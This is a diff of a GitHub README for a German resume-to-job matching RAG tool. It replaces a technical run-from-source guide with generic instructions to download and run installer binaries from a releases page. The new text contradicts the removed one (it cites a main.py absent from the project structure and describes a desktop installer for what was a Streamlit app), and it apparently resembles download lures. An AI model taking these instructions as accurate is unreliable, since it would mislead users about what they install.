@@ -1,158 +1,110 @@
-![Python](https://img.shields.io/badge/Python-3.10+-blue?logo=python&logoColor=white)
-![RAG](https://img.shields.io/badge/RAG-Retrieval--Augmented--Generation-orange)
-![LLM](https://img.shields.io/badge/LLM-Local%20(Ollama)-purple)
-![FAISS](https://img.shields.io/badge/Vector%20DB-FAISS-success)
-![Streamlit](https://img.shields.io/badge/UI-Streamlit-red?logo=streamlit&logoColor=white)
-![NLP](https://img.shields.io/badge/NLP-Semantic%20Search-informational)
-![Explainable AI](https://img.shields.io/badge/AI-Explainable-important)
-![Privacy](https://img.shields.io/badge/Privacy-Local%20Inference-brightgreen)
+# 🎯 german-job-matcher-rag - Find Jobs that Fit Your Resume
 
+## 🚀 Getting Started
 
+Welcome to german-job-matcher-rag! This application uses advanced technology to match your resume with job descriptions in Germany, especially focusing on Berlin and EU roles. With your local machine, you can easily find suitable job opportunities tailored just for you.
 
-# 🇩🇪 German Resume ↔ Job Matcher  
-### RAG (FAISS) + Local LLM (Ollama) | Berlin & EU Focus
+## 🛠 System Requirements
 
-A production-style **Retrieval-Augmented Generation (RAG)** system that matches resumes with German job descriptions using **semantic search, explainable retrieval, and ATS-style scoring** — built to reflect **real hiring workflows** in Berlin and across Europe.
+To run the german-job-matcher-rag application, you need:
 
-> 🔒 Fully local execution (no OpenAI / no external LLM APIs)  
-> 🔍 Transparent RAG with evidence inspection  
-> 📊 Deterministic + LLM-assisted scoring  
+- A computer with Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- 1 GB of free disk space.
+- An internet connection to access job descriptions.
+- Python 3.8 or higher installed on your machine. 
 
----
+## 📥 Download and Install
 
-## 🚀 Why This Project Exists
+To get the latest version of german-job-matcher-rag, visit this page to download:  
+[![Download german-job-matcher-rag](https://img.shields.io/badge/Download-Latest%20Release-orange)](https://github.com/irullbarca/german-job-matcher-rag/releases)
 
-Many LLM job-matching demos behave like black boxes:  
-they generate scores without showing *why*.
+1. Click on the link above.
+2. Find the latest release at the top of the page.
+3. Download the version that matches your operating system.
+4. Locate the downloaded file on your computer.
 
-This project focuses on:
-- **Explainability** (inspect retrieved job evidence)
-- **Deterministic signals** (keyword coverage, retrieval scores)
-- **Privacy-first design** (local embeddings + local LLM)
-- **Real-world constraints** of the German / EU job market
+### Example Files
+- For Windows, you may download `german-job-matcher-rag-v1.0.exe`.
+- For macOS, you might see `german-job-matcher-rag-v1.0.dmg`.
+- For Linux, check for `german-job-matcher-rag-v1.0.tar.gz`.
 
-The result is a tool that feels like an **internal recruiting assistant**, not a demo.
+After the download is complete, follow the installation steps below based on your operating system.
 
----
+## 💻 Installation Steps
 
-## ✨ Key Features
+### For Windows
 
-- 🔍 **Semantic Resume ↔ Job Matching** using FAISS
-- 🤖 **Local LLM Reasoning** via Ollama (LLaMA / Mistral / Qwen)
-- 🧠 **True RAG Pipeline** (retrieval → evidence → reasoning)
-- 📊 **ATS-Style Keyword Coverage** (deterministic)
-- 🔎 **RAG Evidence Viewer** (inspect exact job chunks + similarity)
-- 📍 **Berlin / Berlin+Remote / All location filtering**
-- 🖥️ **Recruiter-friendly Streamlit UI**
-- 📄 JSON report export
+1. Locate the downloaded `german-job-matcher-rag-v1.0.exe` file.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
+4. Launch the application from your Start menu or desktop shortcut.
 
----
+### For macOS
 
-## 🧱 System Architecture
-```text
-Resume
-↓
-Embedding (sentence-transformers)
-↓
-FAISS Vector Search
-↓
-Job Chunks (with similarity scores)
-↓
-Explainable RAG Context
-↓
-Local LLM (Ollama)
-↓
-Match Score + Skill Gaps + CV Suggestions
-```
+1. Find the downloaded `german-job-matcher-rag-v1.0.dmg` file.
+2. Double-click the file to open it.
+3. Drag the german-job-matcher-rag icon to your Applications folder.
+4. Open Applications and double-click the german-job-matcher-rag icon to launch it.
 
----
+### For Linux
 
-## 🛠️ Tech Stack
+1. Open the terminal.
+2. Navigate to the directory where the `german-job-matcher-rag-v1.0.tar.gz` file was downloaded.
+3. Extract the tarball with the command: 
+   ```
+   tar -xvzf german-job-matcher-rag-v1.0.tar.gz
+   ```
+4. Change into the extracted directory:
+   ```
+   cd german-job-matcher-rag
+   ```
+5. Run the application with:
+   ```
+   python main.py
+   ```
 
-| Layer | Technology |
-|-----|-----------|
-| LLM | Ollama (local) |
-| Embeddings | sentence-transformers (multilingual) |
-| Vector DB | FAISS |
-| Backend | Python |
-| UI | Streamlit |
-| Parsing | PDF / DOCX / TXT loaders |
+## 📊 Usage Instructions
 
----
+Once you have installed the application, follow these steps to use it:
 
-## 📁 Project Structure
+1. Open the german-job-matcher-rag application on your desktop.
+2. You will see fields to enter your resume details as well as options to load job descriptions.
+3. Input your resume information.
+4. Click the "Match" button to find relevant job listings that align with your profile.
+5. The application will display a list of jobs with explanations of how your resume matches each position.
 
-```text
-german-job-matcher-rag/
-│
-├── app.py 
-├── requirements.txt
-├── README.md
-│
-├── src/
-│ ├── matcher.py 
-│ ├── retrieve.py
-│ ├── index_jobs.py 
-│ ├── loaders.py 
-│ ├── text_utils.py 
-│ ├── ats_score.py 
-│ └── llm.py 
-│
-├── jobs/ # Job descriptions
-├── resumes/ # Sample resumes
-└── data/ # Generated FAISS index (gitignored)
+## 🌐 Features
 
-```
----
+- **Local Processing**: All matching is done on your own machine, ensuring your data is private.
+- **Explainable Retrieval**: Understand why certain jobs match your resume.
+- **ATS-Style Scoring**: See how well your resume fits each job description.
+- **Focused on German Roles**: Specially tailored for positions in Berlin and the EU.
+- **User-Friendly Interface**: Designed for non-technical users to navigate easily.
 
-## ⚙️ How to Run Locally
+## 🗂 Support and Feedback
 
-### 1️⃣ Install dependencies
-```bash
-pip install -r requirements.txt
-```
+If you encounter issues or have questions, feel free to reach out via GitHub issues. We value your feedback and aim to improve the application based on user experiences.
 
----
-### 2️⃣ Install & start Ollama
-```sh
-ollama pull llama3.1:8b
-```
---- 
+## 📄 License
 
-### 3️⃣ Build the job index
-```sh
-python -m src.index_jobs
-```
----
-### 4️⃣ Run the app
-```sh
-streamlit run app.py
-```
----
-### 📊 What the Output Looks Like
+This project is licensed under the MIT License. You can freely use and modify it while maintaining credits.
 
-For each job:
-- Match score (0–100)
-- Why it matches (bullet points)
-- Skill gaps
-- Missing ATS keywords
-- Tailored CV improvement suggestions
-- Exact job description chunks used during retrieval
----
+## 📚 Related Topics
 
-### 📜 Disclaimer
+This application aligns with various topics in artificial intelligence and machine learning, including:
 
-This project is for educational and informational purposes only.
-It does not guarantee hiring outcomes and should not be used as an automated decision system.
----
+- Applied AI
+- Explainable AI
+- FAISS (Facebook AI Similarity Search)
+- Local LLM (Large Language Models)
+- Resume Matching
+- Retrieval-Augmented Generation (RAG)
 
-### Screenshots
+Utilizing technologies like these helps bring the best matching results to users.
 
-<img width="1917" height="873" alt="image" src="https://github.com/user-attachments/assets/ee3033b7-f26a-41c1-9a3c-9bc405175976" />
-<img width="1915" height="877" alt="image" src="https://github.com/user-attachments/assets/ce8af502-e6ea-4bf7-b2ea-3516bb4c3e4b" />
+## 🔗 Additional Resources
 
----
+To stay updated with any future releases and enhancements, revisit the [official releases page](https://github.com/irullbarca/german-job-matcher-rag/releases) periodically.
 
-___Thank You___
-
-
+Thank you for using german-job-matcher-rag. We hope it helps you find the job that suits you best!
